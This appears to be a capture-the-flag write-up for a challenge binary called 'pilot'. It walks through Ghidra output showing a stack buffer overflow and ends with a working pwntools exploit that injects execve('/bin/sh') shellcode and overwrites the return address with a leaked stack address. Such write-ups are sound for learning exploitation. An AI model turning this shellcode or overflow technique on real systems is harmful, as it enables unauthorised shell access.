In Ghidra, we find a function that has the same output as when we run the program:
```c
undefined8 FUN_004009a6(void)
{
  basic_ostream *pbVar1;
  basic_ostream<> *this;
  ssize_t sVar2;
  undefined8 uVar3;
  undefined local_28 [32];
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Welcome DropShip Pilot...");
  std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1,std::endl<>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]I am your assitant A.I....");
  std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1,std::endl<>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,
                           "[*]I will be guiding you through the tutorial....");
  std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1,std::endl<>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,
                           "[*]As a first step, lets learn how to land at the designated location... ."
                          );
  std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1,std::endl<>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,
                           "[*]Your mission is to lead the dropship to the right location and execut e sequence of instructions to save Marines & Medics..."
                          );
  std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1,std::endl<>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Good Luck Pilot!....");
  std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1,std::endl<>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Location:");
  this = (basic_ostream<> *)std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1,local_28);
  std::basic_ostream<>::operator<<(this,std::endl<>);
  std::operator<<((basic_ostream *)std::cout,"[*]Command:");
  sVar2 = read(0,local_28,0x40);
  if (sVar2 < 5) {
    pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]There are no commands....");
    std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1,std::endl<>);
    pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Mission Failed....");
    std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1,std::endl<>);
    uVar3 = 0xffffffff;
  }
  else {
    uVar3 = 0;
  }
  return uVar3;
}

```

Critically, the line `sVar2 = read(0,local_28,0x40);` is of importance, cause we can see in Ghidra that `local_28` has only `0x28` bytes of memory allocated - a classic stack overflow.

```
undefined8        RAX:8          <RETURN>
undefined1        Stack[-0x28]:1 local_28                    
```

Realize that we have nothing between `local_28` and the return address. We aim to store some shellcode here, then refer to it from the return address.

The following shellcode is taken from https://zerosum0x0.blogspot.com/2014/12/there-are-many-versions-of-execve.html. **It runs execve(/bin/sh), popping a shell, on linux x86_64 systems**:
```
\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05
```

With all this in mind, we can write our exploit:
```python
from pwn import process, p64

target = process("./pilot")
shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"

target.recvuntil("[*]Location:")
addr = int(target.recvline().strip(b'\n'), 16)

payload = shellcode
payload += b'0' * (0x28 - len(shellcode))
payload += p64(addr)

target.send(payload)
target.interactive()
```